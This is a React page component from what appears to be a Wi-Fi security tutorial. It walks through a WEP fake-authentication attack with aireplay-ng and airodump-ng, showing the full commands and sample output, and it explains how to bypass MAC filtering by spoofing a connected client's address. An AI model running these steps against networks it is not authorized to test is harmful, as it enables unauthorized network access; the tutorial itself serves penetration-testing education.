import Terminal from '../../components/Terminal';
import InfoBox from '../../components/InfoBox';
import Diagram from '../../components/Diagram';
import { Troubleshooting, TroubleItem } from '../../components/Troubleshooting';

export default function FakeAuth() {
  return (
    <div className="content-area">
      <div className="topic-header">
        <div className="topic-breadcrumb">WEP Cracking <span>/</span> Fake Authentication</div>
        <h1>Fake Authentication Attack</h1>
        <p className="topic-desc">Fake authentication associates your adapter with the target AP without knowing the WEP key. This is required before you can inject packets (like ARP replay).</p>
      </div>

      <div className="topic-section">
        <h2>Why Fake Authentication?</h2>
        <p>To inject packets into a WEP network, the AP needs to accept frames from your MAC address. Fake authentication tells the AP "I'm a legitimate client" so it accepts your injected packets.</p>

        <Diagram title="Fake Authentication Process">
{`   ┌──────────────┐                         ┌──────────────┐
   │  YOUR ADAPTER │                         │  TARGET AP   │
   │  (wlan0mon)   │                         │  (WEP)       │
   └──────┬───────┘                         └──────┬───────┘
          │                                         │
          │──── Authentication Request ───────────▶│
          │     "I want to join"                   │
          │                                         │
          │◀─── Authentication Response ──────────│
          │     "OK, you're authenticated"         │
          │                                         │
          │──── Association Request ──────────────▶│
          │     "Let me associate"                 │
          │                                         │
          │◀─── Association Response ─────────────│
          │     "You're associated!"               │
          │                                         │
          │     NOW YOU CAN INJECT PACKETS         │
          │                                         │`}
        </Diagram>

        <InfoBox type="note">
          <p>Fake auth only works with <strong>WEP</strong> networks. WPA/WPA2 require the actual password for authentication — you can't fake it.</p>
        </InfoBox>
      </div>

      <div className="topic-section">
        <h2>Running Fake Authentication</h2>

        <h3>Prerequisites</h3>
        <ul>
          <li>Monitor mode enabled</li>
          <li>Target BSSID and channel identified</li>
          <li>airodump-ng running targeted capture in another terminal</li>
        </ul>

        <h3>Terminal 1: Keep airodump-ng Running</h3>
        <Terminal title="Terminal 1 — Capture" lines={[
          [{ type: 'prompt', text: '$ ' }, { type: 'command', text: 'sudo airodump-ng ' }, { type: 'flag', text: '--bssid ' }, { type: 'highlight', text: 'AA:BB:CC:DD:EE:FF ' }, { type: 'flag', text: '--channel ' }, { type: 'number', text: '6 ' }, { type: 'flag', text: '--write ' }, { type: 'string', text: 'wep_capture ' }, { type: 'string', text: 'wlan0mon' }],
        ]} />

        <h3>Terminal 2: Run Fake Authentication</h3>
        <Terminal title="Fake Auth Attack" lines={[
          [{ type: 'prompt', text: '$ ' }, { type: 'command', text: 'sudo aireplay-ng ' }, { type: 'flag', text: '--fakeauth ' }, { type: 'number', text: '0 ' }, { type: 'flag', text: '-a ' }, { type: 'highlight', text: 'AA:BB:CC:DD:EE:FF ' }, { type: 'flag', text: '-h ' }, { type: 'highlight', text: '00:11:22:33:44:55 ' }, { type: 'string', text: 'wlan0mon' }],
          [{ type: 'output', text: '12:00:00  Sending Authentication Request (Open System) [ACK]' }],
          [{ type: 'output', text: '12:00:00  Authentication successful' }],
          [{ type: 'output', text: '12:00:00  Sending Association Request [ACK]' }],
          [{ type: 'output', text: '12:00:00  ' }, { type: 'highlight', text: 'Association successful :-) (AID: 1)' }],
        ]} />
      </div>

      <div className="topic-section">
        <h2>Command Breakdown</h2>
        <table className="info-table">
          <thead>
            <tr><th>Flag</th><th>Purpose</th></tr>
          </thead>
          <tbody>
            <tr><td><code>--fakeauth 0</code></td><td>Run fake auth attack (0 = one attempt, use 30 to re-auth every 30 seconds)</td></tr>
            <tr><td><code>-a AA:BB:CC:DD:EE:FF</code></td><td>BSSID of target AP</td></tr>
            <tr><td><code>-h 00:11:22:33:44:55</code></td><td>Your adapter's MAC address (check with <code>ifconfig wlan0mon</code>)</td></tr>
          </tbody>
        </table>

        <h3>Keep Association Alive</h3>
        <p>Some APs will deauthenticate you after a while. Use a delay to re-authenticate periodically:</p>
        <Terminal title="Persistent Fake Auth" lines={[
          [{ type: 'comment', text: '# Re-authenticate every 30 seconds' }],
          [{ type: 'prompt', text: '$ ' }, { type: 'command', text: 'sudo aireplay-ng ' }, { type: 'flag', text: '--fakeauth ' }, { type: 'number', text: '30 ' }, { type: 'flag', text: '-a ' }, { type: 'highlight', text: 'AA:BB:CC:DD:EE:FF ' }, { type: 'flag', text: '-h ' }, { type: 'highlight', text: '00:11:22:33:44:55 ' }, { type: 'string', text: 'wlan0mon' }],
        ]} />
      </div>

      <div className="topic-section">
        <h2>Verifying Association</h2>
        <p>In the airodump-ng window, you should see your MAC in the client list:</p>
        <Terminal title="airodump-ng showing association" lines={[
          [{ type: 'output', text: ' BSSID              STATION            PWR   Rate  Lost  Packets' }],
          [{ type: 'output', text: ' AA:BB:CC:DD:EE:FF  ' }, { type: 'highlight', text: '00:11:22:33:44:55' }, { type: 'output', text: '  -30   54e-54    0       15' }],
          [{ type: 'comment', text: '# Your MAC appears as a connected station ↑' }],
        ]} />
      </div>

      <Troubleshooting>
        <TroubleItem issue="'Association unsuccessful' or 'Got deauthentication'">
          <div className="solution">Solution:</div>
          <p>The AP might use MAC filtering. Try changing your MAC to one of the already-connected clients:</p>
          <Terminal title="Spoof Client MAC" lines={[
            [{ type: 'prompt', text: '$ ' }, { type: 'command', text: 'sudo ifconfig wlan0mon down' }],
            [{ type: 'prompt', text: '$ ' }, { type: 'command', text: 'sudo macchanger ' }, { type: 'flag', text: '-m ' }, { type: 'highlight', text: 'DD:EE:FF:11:22:33 ' }, { type: 'string', text: 'wlan0mon' }],
            [{ type: 'prompt', text: '$ ' }, { type: 'command', text: 'sudo ifconfig wlan0mon up' }],
            [{ type: 'comment', text: '# Now retry fake auth with this MAC using -h flag' }],
          ]} />
        </TroubleItem>
        <TroubleItem issue="'No ACK' messages">
          <div className="solution">Solution:</div>
          <p>The AP is not receiving your packets. You're either too far away, or the adapter doesn't support injection. Get closer or test injection with <code className="inline-code">aireplay-ng --test wlan0mon</code></p>
        </TroubleItem>
        <TroubleItem issue="Association keeps dropping">
          <p>Use <code className="inline-code">--fakeauth 30</code> instead of <code className="inline-code">--fakeauth 0</code> to maintain the association by re-authenticating every 30 seconds.</p>
        </TroubleItem>
      </Troubleshooting>
    </div>
  );
}
